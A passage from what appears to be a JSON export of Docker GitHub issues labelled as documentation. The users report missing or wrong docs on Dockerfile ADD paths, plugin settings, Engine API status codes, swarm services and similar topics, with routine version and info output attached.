info\r\n```\r\n\r\n```sh\r\nContainers: 153\r\n Running: 0\r\n Paused: 0\r\n Stopped: 153\r\nImages: 1589\r\nServer Version: 1.13.0\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 1290\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host ipvlan macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 03e5862ec0d8d3b3f750e19fca3ee367e13c090e\r\nrunc version: 2f7393a47307a16f8cee44a37b262e8b81021e3e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.4-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 1.952 GiB\r\nName: moby\r\nID: NRXU:ZFNJ:3AC2:WVYL:UODL:44GO:E7AA:AFWL:22FC:FJYR:URTX:SV2N\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 16\r\n Goroutines: 26\r\n System Time: 2017-02-09T19:26:55.917920388Z\r\n EventsListeners: 1\r\nNo Proxy: *.local, 169.254/16\r\nUsername: mohamedbana\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```"},{"labels":["documentation",null],"text":"The TOC on the right side of https://docs.docker.com/engine/deprecated/ has some entries at the wrong indentation. All the entries should have the same indentation.\r\n\r\n<img width=\"233\" alt=\"image\" src=\"https://cloud.githubusercontent.com/assets/11357370/22755255/64201d9a-ee10-11e6-9bfd-4780cff3a403.png\">\r\n"},{"labels":[null,"documentation",null],"text":"I'm trying to add in a Dockerfile a file with square brackets. Consider, for example, the following minimalistic Dockerfile:\r\n\r\n```\r\nFROM alpine\r\n\r\nADD \"arr[0].txt\" /\r\n\r\nCMD [\"bash\", \"-c\", \"ls -la *.txt\"]\r\n```\r\n\r\nAnd a file called `arr[0].txt` in the working directory. Trying to build this Dockerfile, I get:\r\n\r\n```\r\nStep 2/3 : ADD \"arr[0].txt\" /\r\nNo source files were specified\r\n```\r\n\r\nI already tried several variations of this command based on [Go filepath](https://golang.org/pkg/path/filepath/#Match), with no luck:\r\n\r\n* `ADD \"arr\\\\[0\\\\].txt\" /` (No source files were specified)\r\n* `ADD [\"arr\\\\[0\\\\].txt\", \"/\"]` (No source files were specified)\r\n* `ADD arr\\\\[0\\\\].txt /` (lstat arr\\\\[0\\\\].txt: no such file or directory)\r\n* `ADD \"arr\\[0\\].txt\" /` (lstat arr\\\\[0\\\\].txt: no such file or directory)\r\n* `ADD [\"arr\\[0\\].txt\", \"/\"]` (No source files were specified)\r\n* `ADD arr\\[0\\].txt /` (No source files were specified)\r\n\r\nAm I just missing the right pattern, or is this a bug?\r\n"},{"labels":["documentation",null,null],"text":"**Unable to set args for v2 plugins**\r\nThe plugin I'm using supports 3 arguments as seen in this output:\r\n```\r\n# docker plugin inspect nimble\r\n[\r\n    {\r\n        \"Config\": {\r\n            \"Args\": {\r\n                \"Description\": \"Group connection information\",\r\n                \"Name\": \"group\",\r\n                \"Settable\": [\r\n                    \"ip\",\r\n                    \"user\",\r\n                    \"pass\"\r\n                ],\r\n                \"Value\": [\r\n                    \"\",\r\n                    \"\",\r\n                    \"\"\r\n                ]\r\n            },\r\n```\r\n\r\nHowever, I am not able to set the values.\r\n```\r\n# docker plugin set nimble group.ip=10.1.2.3\r\nError response from daemon: \"group.ip\" is not settable\r\n```\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1. Create a plugin with 'Args' defined\r\n2. Inspect the plugin\r\n3. Attempt to set the arguments defined in the 'Args' configuration\r\n\r\n**Describe the results you received:**\r\nUnable to set args\r\n```\r\nDEBU[6382] Calling POST /v1.25/plugins/nimble/set       \r\nERRO[6382] Handler for POST /v1.25/plugins/nimble/set returned error: \"group.ip\" is not settable \r\n```\r\n\r\n**Describe the results you expected:**\r\nArgs should be set.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nNone.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n# docker version\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:58:26 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:58:26 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\n# docker info\r\nContainers: 1\r\n Running: 0\r\n Paused: 0\r\n Stopped: 1\r\nImages: 6\r\nServer Version: 1.13.0\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 7\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 03e5862ec0d8d3b3f750e19fca3ee367e13c090e\r\nrunc version: 2f7393a47307a16f8cee44a37b262e8b81021e3e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.4.0-62-generic\r\nOperating System: Ubuntu 16.04.1 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 3.859 GiB\r\nName: eforgette-u16p2\r\nID: UQWP:CEW2:4P3T:AFR2:3R7U:SUL3:QH2Y:5JGY:AYIY:64YM:WRT5:AZRJ\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 14\r\n Goroutines: 22\r\n System Time: 2017-02-07T09:53:59.166981721-08:00\r\n EventsListeners: 0\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nNone."},{"labels":["documentation",null],"text":"On doc page: https://github.com/docker/docker/blob/1.13.x/docs/reference/commandline/service_create.md\r\n\r\nPlease add [this example](https://github.com/docker/docker/issues/24879#issuecomment-278044244) about how to use `--container-label`.\r\n\r\nCheers!"},{"labels":["documentation",null],"text":"The 1.13.0 docs do not describe the effect of using `--memory-swap=0`. The default is `-1` which means unlimited. Does `0` mean no swap will be allowed, or do I have to set `--memory` and `--memory-swap` to the same value to accomplish that?\r\n\r\nhttps://docs.docker.com/engine/admin/resource_constraints/#/memory-swap-details"},{"labels":["documentation",null,null],"text":"Hi, All,\r\n\r\nI found in swagger.yml and api doc, there are some missing status codes about network:\r\n\r\n```\r\nGET /networks/(id or name) misses status code of 500;\r\nDELETE /networks/(id or name) missed status code of 403;\r\n```\r\n\r\nHere is my environment, we can see that there are two network has a prefix network id of `a`:\r\n```\r\nroot@ubuntu:~# docker network ls\r\nNETWORK ID          NAME                DRIVER              SCOPE\r\nb80b14598d1f        allen               bridge              local\r\nabe5fa290b6d        allen2              bridge              local\r\ndb8dfef4e6de        allen3              bridge              local\r\na89bfaea7f72        allen4              bridge              local\r\nfd6a89aad8ff        bridge              bridge              local\r\n85ded5476b05        docker_gwbridge     bridge              local\r\nd909a9f88b4c        host                host                local\r\nz1sybtvc99hu        ingress             overlay             swarm\r\n615a39ff6c47        none                null                local\r\n```\r\nThen we send an http request like the following pic, we found the status code is 500 which is not versioned in the swagger.yml nor api docs:\r\n<img width=\"782\" alt=\"2017-02-03 1 25 57\" src=\"https://cloud.githubusercontent.com/assets/9465626/22580645/06843094-ea15-11e6-845d-92a959624c63.png\">\r\n\r\n\r\nSecond, we send a DELETE request for network `host`, then daemon will response a status code of 403 which is also not versioned in swagger.yml or api docs. Here is test pic:\r\n![wechatimg4](https://cloud.githubusercontent.com/assets/9465626/22580703/a0a774d8-ea15-11e6-8ee1-32d82da5fbd7.jpeg)\r\n\r\n**Steps to reproduce the issue:**\r\n1.\r\n2.\r\n3.\r\n\r\n**Describe the results you received:**\r\nThere is no status code 500 for api endpoint `GET /networks/(id or name), nor 404 for `DELETE /networks/(id or name)`\r\n\r\n**Describe the results you expected:**\r\nrelated status codes are versioned in doc\r\n\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nroot@ubuntu:~# docker version\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:50:17 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:50:17 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nroot@ubuntu:~# docker info\r\nContainers: 8\r\n Running: 0\r\n Paused: 0\r\n Stopped: 8\r\nImages: 37\r\nServer Version: 1.13.0\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 202\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: active\r\n NodeID: gkdoxio9hz1b325t544ftpry4\r\n Is Manager: true\r\n ClusterID: 3bidcebapq2115pts6cik50ah\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n Node Address: 192.168.59.103\r\n Manager Addresses:\r\n  192.168.59.103:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 03e5862ec0d8d3b3f750e19fca3ee367e13c090e\r\nrunc version: 2f7393a47307a16f8cee44a37b262e8b81021e3e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\nKernel Version: 3.19.0-25-generic\r\nOperating System: Ubuntu 14.04.3 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 1.954 GiB\r\nName: ubuntu\r\nID: Q2ZC:GWDN:27OH:GRMH:G6QU:W7QP:4TIX:Q5F6:YEVK:45XP:EXHC:HOB5\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 32\r\n Goroutines: 132\r\n System Time: 2017-01-29T14:51:41.049720516+08:00\r\n EventsListeners: 0\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nRegistry Mirrors:\r\n https://a.b.c/\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n"},{"labels":[null,"documentation"],"text":"The [ARG section](https://docs.docker.com/engine/reference/builder/#/arg) says the following:\r\n\r\n>**Warning:** It is not recommended to use build-time variables for passing secrets like github keys, user credentials etc. Build-time variable values are visible to any user of the image with the docker history command.\r\n\r\nThis, however, is not very helpful. The warning should mention what to use instead when you need secrets during build time."},{"labels":[null,"documentation",null],"text":"I read the v1.25 document, but I can't find any related information.  I was wondering if \"docker stack deploy\" api was the on roadmap.  "},{"labels":["documentation"],"text":"The [configuration file documentation](https://docs.docker.com/engine/reference/commandline/cli/#/configuration-files) states\r\n\r\n> The property psFormat specifies the default format for docker ps output. When the --format flag is not provided with the docker ps command, Docker’s client uses this property. If this property is not set, the client falls back to the default table format. For a list of supported formatting directives, see the [Formatting section in the docker ps documentation](https://docs.docker.com/engine/reference/commandline/ps/)\r\n\r\nThere's no such section in the docker ps documentation."},{"labels":["documentation"],"text":"A while ago, I started contributing to docker and was able to fix few doc and cli related issues.\r\nBut was unable to pick issues related to other areas like runtime, networking, etc. It is bit difficult to know how runc, containerd, etc are used by docker in its code.\r\n\r\nFor any beginner level contributor, it becomes difficult to understand the entire code flow or even a single docker component codebase.\r\nThere are documentation available for few of the tools but it don't mention anything about the tools used internally within docker.\r\nThere should be documentation explaining all tools and technologies that docker uses internally in the code like : `runc, libnetwork, containerd, docker-containerd-shim, ctr, cobra, rootfs, etc`\r\nShould also document : how docker creates namespaces, which all system calls do docker calls internally, how docker uses runc and so on.\r\nThere should be pointers to files and repository where the code resides for each of these tools like code for rootfs related stuff, image related stuff, etc.\r\nSuch documentation will really help beginner level contributor a lot."},{"labels":[null,"documentation",null],"text":"The docs at https://docs.docker.com/engine/reference/commandline/version/ say to get the template fields for `docker version` output, use `docker version --format '{{json .}}'` which gives me:\r\n\r\n```\r\n{\"Client\":{\"Version\":\"1.13.0\",\"ApiVersion\":\"1.25\",\"GitCommit\":\"49bf474\",\"GoVersion\":\"go1.7.3\",\"Os\":\"darwin\",\"Arch\":\"amd64\",\"BuildTime\":\"Wed Jan 18 16:20:26 2017\"},\"Server\":{\"Version\":\"1.13.0\",\"ApiVersion\":\"1.25\",\"MinAPIVersion\":\"1.12\",\"GitCommit\":\"49bf474\",\"GoVersion\":\"go1.7.3\",\"Os\":\"linux\",\"Arch\":\"amd64\",\"KernelVersion\":\"4.9.5-moby\",\"Experimental\":true,\"BuildTime\":\"Wed Jan 18 16:20:26 2017\"}}\r\n```\r\n\r\nSo I try\r\n```\r\ndocker version --format '{{.Server.ApiVersion}}'\r\n\r\ntemplate: :1:9: executing \"\" at <.Server.ApiVersion>: can't evaluate field ApiVersion in type *types.Version\r\n```\r\n\r\nEventually I guess and try\r\n```\r\ndocker version --format '{{.Server.APIVersion}}'\r\n1.25\r\n```\r\n\r\nSo the output on the JSON list has a different casing, making it hard to work out what the Go names are. I blame Go's weird JSON handling, but I wonder if it can be fixed? Or maybe the docs just could add a note?\r\n\r\nActually the JSON has the same name\r\n```\r\ndocker version --format '{{json .Server.ApiVersion}}'\r\n\r\ntemplate: :1:14: executing \"\" at <.Server.ApiVersion>: can't evaluate field ApiVersion in type *types.Version\r\ndocker version --format '{{json .Server.APIVersion}}'\r\n\"1.25\"\r\n```\r\n\r\n```\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Wed Jan 18 16:20:26 2017\r\n OS/Arch:      darwin/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Wed Jan 18 16:20:26 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: true\r\n```\r\n\r\ncc @thaJeztah "},{"labels":["documentation"],"text":"The page https://docs.docker.com/engine/admin/logging/log_tags/ provides link `logging context` to https://github.com/docker/docker/blob/master/daemon/logger/context.go that is not available any more."},{"labels":["documentation"],"text":"'docker/' is no longer automatically added as a prefix (after https://github.com/docker/docker/pull/22384), but https://docs.docker.com/engine/admin/logging/log_tags/ still prepends 'docker/'. That log-opt tag would no longer result in the example log line. It would be missing the 'docker/' prefix."},{"labels":["documentation"],"text":"Seems like the Dockerfile reference web-page does not exist anymore or if the url has been changed google does not find it for some reason.\r\n\r\nThe page is still on github https://github.com/docker/docker/blob/master/docs/reference/builder.md"},{"labels":["documentation",null,null],"text":"I am trying to understand the resource control related to the CPUs from Swarm Mode.\r\n\r\nFrom the docs I just see:\r\nhttps://docs.docker.com/engine/reference/commandline/service_create/\r\n--limit-cpu value                Limit CPUs (default 0.000)\r\n\r\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#create-a-service\r\nNanoCPUs – CPU limit in units of 10-9 CPU shares.\r\n\r\nThe concept is completely different from the ones related to containers and I think there is a lack of documentation regarding the use of these parameters (limit-cpu and reserved-cpu)"},{"labels":["documentation",null],"text":"I'm trying to run the example in this documentation: https://godoc.org/github.com/docker/docker/client#hdr-Usage\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"context\"\r\n\t\"fmt\"\r\n\r\n\t\"github.com/docker/docker/api/types\"\r\n\t\"github.com/docker/docker/client\"\r\n)\r\n\r\nfunc main() {\r\n\tcli, err := client.NewEnvClient()\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tcontainers, err := cli.ContainerList(context.Background(), types.ContainerListOptions{})\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tfor _, container := range containers {\r\n\t\tfmt.Printf(\"%s %s\\n\", container.ID[:10], container.Image)\r\n\t}\r\n}\r\n```\r\n\r\nBut for obvious reasons, when running the example against the latest release of Docker, 1.12.5, that doesn't work.\r\nThe error I get is: \r\n```\r\npanic: Error response from daemon: client is newer than server (client API version: 1.26, server API version: 1.24)\r\n```\r\nI understand that semantic versioning has no significance for this project, because the API breaks in point releases, but it would be cool if at least examples would work."},{"labels":["documentation",null],"text":"https://docs.docker.com/engine/reference/commandline/tag/\r\n\r\n````\r\nA tag name may contain lowercase and uppercase characters, digits, underscores, periods and dashes. A tag name may not start with a period or a dash and may contain a maximum of 128 characters.\r\n````\r\n\r\nWhat is a character? You mean ASCII Latin letters? The use of the word \"character\" is WRONG because a character refers to ANY code point! There is also more than one character referred to as dash and underscore in unicode. That needs to be specified properly too. I know you're probably referring to ASCII and not unicode, but you never actually write that."},{"labels":["documentation",null,null],"text":"**Description**\r\nI found that `docker service update` command document is not so detailed in https://github.com/docker/docker/blob/master/docs/reference/commandline/service_update.md\r\n\r\nI think there are lots of missing options in explanation, such as `--rollback`, and so on.\r\n\r\nIn addition, in the doc it says:\r\n```\r\nThe parameters are the same as [`docker service create`](service_create.md).\r\n``` \r\n\r\nI think that is not true.\r\n\r\nHere is the evidence:\r\n```\r\nroot@ubuntu:~# docker service create --help | grep \"\\-\\-\" | wc -l\r\n45\r\nroot@ubuntu:~# docker service update --help | grep \"\\-\\-\" | wc -l\r\n57\r\n```\r\n So, there is at least 12 parameters that are not the same.\r\n\r\nI think we need a detailed `docker service update` doc for the users. "},{"labels":["documentation",null,null,null],"text":"**Description**\r\n\r\nThere is very little information from API documentation that can explain how to use REST request to promote or demote swarm node from remote side. It seems I should post \"/nodes/id/update\" with parameters attached. However, some parameters like 'version' are vague. Can you provide an example to show promote/demote?\r\n\r\nSomething like:\r\n`curl --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"version\": .., ..}' http:/nodes/id/update`\r\n\r\nThanks"},{"labels":["documentation",null],"text":"As far as I can tell all tutorials are for sandbox style swarm where multiple VMs run on a single physical host. I can't find a good resource that gives a simple tutorial on getting a swarm running across more than one physical machine. Maybe this would need to be done per OS, as my understanding is Windows and MacOS don't support this natively, but do when using docker-machine.\r\n\r\nIn an ideal tutorial, I think a user should be able to follow the commands on their OS, and get a swarm running across two physical hosts. \r\n\r\nFrom my Windows OS perspective, questions I'd like answered in such a tutorial (as these are areas where I'm stuck after looking at the current tutorials and also production swarm docs):\r\n* On Windows must I (or is it best practice to) use `docker-machine create --swarm etc`\r\n* What is the relationship between `docker-machine create --swarm etc`, `docker swarm etc`, `docker run swarm etc`. After trial and error I think I understand how the layers build upon each other, but an explicit description would be nice\r\n\r\nAs a final bit of context to this request, I'm trying to set up a two node swarm across two Windows hosts. I think I must use `docker-machine create --swarm etc` - and everything appears to work OK except the worker node is stuck in pending. I _think_ this is because TLS is enabled by default (and it can't be disabled, or disabling is too dangerous to provide any explanation of how to do it :P ) so that's my next thing to try... but it would be nice if there was a quick one pager that pointed out all the relevant steps."},{"labels":[null,"documentation"],"text":"The API documentation (and swagger.yaml) says `POST /images/create` can only return a 200 or a 500. Snippet from swagger.yaml:\r\n```yaml\r\n  /images/create:\r\n    post:\r\n      ...\r\n      responses:\r\n        200:\r\n          description: \"no error\"\r\n        500:\r\n          description: \"server error\"\r\n          schema:\r\n            $ref: \"#/definitions/ErrorResponse\"\r\n```\r\n\r\nHowever, it can also return a 404 if you try to pull an image and it isn't found in a registry. Here's an example:\r\n\r\n```\r\n$ curl -v --unix-socket /var/run/docker.sock -X POST 'http://localhost/images/create?fromImage=bogus'\r\n...\r\n< HTTP/1.1 404 Not Found\r\n< Api-Version: 1.25\r\n< Content-Length: 75\r\n< Content-Type: application/json\r\n< Date: Wed, 30 Nov 2016 16:54:26 GMT\r\n< Docker-Experimental: true\r\n< Server: Docker/1.13.0-rc2 (linux)\r\n<\r\n{\"message\":\"repository bogus not found: does not exist or no read access\"}\r\n...\r\n```\r\n\r\nThat 404 response should be documented."},{"labels":["documentation",null],"text":"Could we create a doc that has a table of plugins that are supported for 1.13?  Ideally in the future this should be in the hub / store but a doc to start would be great."},{"labels":["documentation",null,null],"text":"I noticed that when I created a new service using `docker swarm create`, the engine will try pulling the latest images even if the expected image is already contained in local `docker images`.\r\n\r\nSo my question is that once the service is running already with a certain scale number (such as scale=3), and then I push new latest image to registry, whether the engine automatically pull the latest image and restart the running services  serveral hours later?\r\n\r\nActually, I don't want it to automatically do updating when service is running."},{"labels":["documentation",null,null],"text":""},{"labels":[null,"documentation",null],"text":"Just adding this for discussion so that we can find how to resolve this; this occurred to me while reviewing https://github.com/docker/docker/pull/28734\r\n\r\nJekyll requires some non-standard markdown markup markers for certain parts of the documentation (`{% raw %}` / `{% end raw %}`). Before the switch to Jekyll, these markers were not needed, so it was possible to copy / re-use the same markdown for both the CLI reference, and the man-pages.\r\n\r\nIf we want to generate both the CLI docs and man-pages using the same source, we may have to make some changes so that the man-page generation understands those markers\r\n\r\n/cc @johndmulhausen @FrenchBen @dnephin @cpuguy83 "},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nWhen pulling an image, over a slow connection, with two larger layers (>40M) followed by a small layer (<10M) it can fail due to i/o timout errors.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Install docker on machine where connection can be throttled\r\n2. Throttle network to 2-3mbps\r\n3. `docker pull` image with a few larger layers\r\n\r\n**Describe the results you received:**\r\nDocker downloads three layers at a time. So initially the first three start to download. Then once one of them completes the fourth layer attempts to download, however all available bandwidth is being used by the two layers still downloading. When bandwidth is this low the request for the fourth layer fails. After a couple of retries the pull aborts with a `dial tcp ... i/o timeout` error, regardless of whether the other two layers are still successfully downloading.\r\n\r\n**Describe the results you expected:**\r\nIt would be nice to have a command line flag for `docker pull` along the lines of `--num-downloads=1` which downloads each layer one at a time. This way bandwidth would be available for each layer because the previous would've completed.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 3\r\n Running: 3\r\n Paused: 0\r\n Stopped: 0\r\nImages: 15\r\nServer Version: 1.12.3\r\nStorage Driver: devicemapper\r\n Pool Name: docker-253:1-33598067-pool\r\n Pool Blocksize: 65.54 kB\r\n Base Device Size: 10.74 GB\r\n Backing Filesystem: xfs\r\n Data file: /dev/loop0\r\n Metadata file: /dev/loop1\r\n Data Space Used: 465.2 MB\r\n Data Space Total: 107.4 GB\r\n Data Space Available: 27.72 GB\r\n Metadata Space Used: 1.294 MB\r\n Metadata Space Total: 2.147 GB\r\n Metadata Space Available: 2.146 GB\r\n Thin Pool Minimum Free Space: 10.74 GB\r\n Udev Sync Supported: true\r\n Deferred Removal Enabled: false\r\n Deferred Deletion Enabled: false\r\n Deferred Deleted Device Count: 0\r\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\r\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\r\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\r\n Library Version: 1.02.107-RHEL7 (2016-06-09)\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: host bridge null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: seccomp\r\nKernel Version: 3.10.0-327.36.3.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 993.3 MiB\r\nName: localhost\r\nID: QKQN:YZZU:PCRX:WO66:FGG4:LUR4:PVR5:QBLM:NKE4:B52W:ZCAU:5TRQ\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\nInsecure Registries:\r\n 127.0.0.0/8\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nVMware VM running Centos 7 on a home broadband connection\r\n"},{"labels":["documentation",null,null,null],"text":"**Description**\r\n\r\nDocker volume command documentation files do not fully describe expected behavior for contributors writing volume drivers. In particular, volume management in swarm mode can be troublesome for clustered storage systems when determining which node to create volumes and where to report volume list. This can lead to cartesian bugs when creating volumes (every node creates a volume based on the volume create request). Some plugin authors have been confused as to where to report a volume as available depending on how their storage system manages volumes.\r\n\r\n@anusha-ragunathan is aware of this and will be following up with more info.\r\n\r\nCC'ing @thaJeztah @stevvooe @vieux per Anusha's request."},{"labels":["documentation"],"text":"While it's clear how to use the `--tmpfs` flag on `docker run`, it isn't clear how to accomplish the same thing via the Remote API because the `HostConfig.Tmpfs` option is undocumented [here](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/create-a-container).\r\n\r\nIt took a fair amount of trial-and-error to figure out that it's meant to look something like this:\r\n\r\n```js\r\n'HostConfig': {\r\n  // ...\r\n  'Tmpfs': {\r\n    '/tmp': 'rw,exec' // mount options (your choice)\r\n  }\r\n}\r\n```\r\n\r\nHopefully documenting this here, and eventually in the actual API docs, will save someone else from diving through [this](https://github.com/docker/docker/blob/master/api/types/container/host_config.go)."},{"labels":["documentation",null],"text":"https://github.com/docker/docker/pull/27998 seems to have been merged with without any documentation.\r\n\r\nThere should be.\r\n\r\nShort version how to use these features to get the ball rolling:\r\n\r\n1. Make a new `docker-compose.yml` or port an existing one, with `version: '3'` explicitly specified.  Seems the \"schema\" (layout of `services`, `networks`, etc. keys) did not change much in this new version but some parameters for services are unsupported.  I'm guessing `build:` is likely not supported as well?\r\n2. Run `docker deploy --compose-file docker-compose.yml stackname`.\r\n3. `docker stack` can be used to view the generated services for the \"stack\" defined by the Docker Compose file.  e.g., `docker stack ls` to view created stacks, `docker stack services stackname` to view the services associated with that stack, etc.\r\n\r\nFYI @londoncalling @johndmulhausen "},{"labels":[null,"documentation"],"text":"## Reasoning\r\n\r\nAs part of [my work to improve the API documentation](https://github.com/docker/docker.github.io/pull/210) I realised that \"Docker Remote API\" is a bit of a confusing name. The Docker Registry serves the [Docker Registry API](https://docs.docker.com/registry/spec/api/), Docker Cloud serves the [Docker Cloud API](https://docs.docker.com/registry/spec/api/), Docker Hub has (had?) the [Docker Hub API](https://docs.docker.com/v1.7/reference/api/docker-io_api/), Docker Trusted Registry has the [Docker Trusted Registry API](https://docs.docker.com/apidocs/overview/), but Engine is the odd one out.\r\n\r\nAs far as I can see, it's a historical artefact from when \"Docker\" was just the Engine. We've since added other APIs, and the original was never given a distinctive name.\r\n\r\nBesides consistency, here are some reasons for the change:\r\n\r\n1) \"Remote\" is redundant – all HTTP APIs are remote. \"Docker API\" would collide with other Docker APIs, hence \"Docker Engine API\".\r\n2) When you want to find the API for the Engine, it's not immediately clear that you should be looking for the \"Remote API\". (And vice versa, \"Remote API\" does not make it immediately obvious that it's the thing the Engine exposes.)\r\n3) The information architecture in the documentation is a bit weird, because \"Remote API\" doesn't comfortably sit under \"Engine\".\r\n\r\n## Implementation\r\n\r\nThe only place we reference it seems to be in the documentation and CLI docs, so looks like we can just do a big ol' search and replace.\r\n\r\nThe only breakage I can think of is if people search for \"Docker Remote API\" on Google and the documentation doesn't turn up. To counteract this, we can leave it as the \"Remote API\" in old versions of the API documentation, and add \"Remote API\" to the keywords of the latest API docs. Or, just a bit of copy like: \"In version X of Docker and below, the Engine API was called the Docker Remote API.\"\r\n\r\n/cc @dnephin @johndmulhausen @icecrime @shykes "},{"labels":["documentation",null,null,null],"text":"**Description**\r\n\r\nWhen I read documentation about live-restore option I supposed that it is supported by Docker for Windows. There is no one mention that it is not supported: https://docs.docker.com/engine/admin/live-restore/\r\n\r\nFurthermore, this documentation https://docs.docker.com/engine/reference/commandline/dockerd/ lists this option in \"Windows configuration file\" section. But I was not able to configure it in both ways (as an argument of dockerd and variable of daemon.json)\r\n\r\n**Steps to reproduce the issue:**\r\n1. When I try to run dockerd with --live-restore option I got a error\r\n```\r\nPS 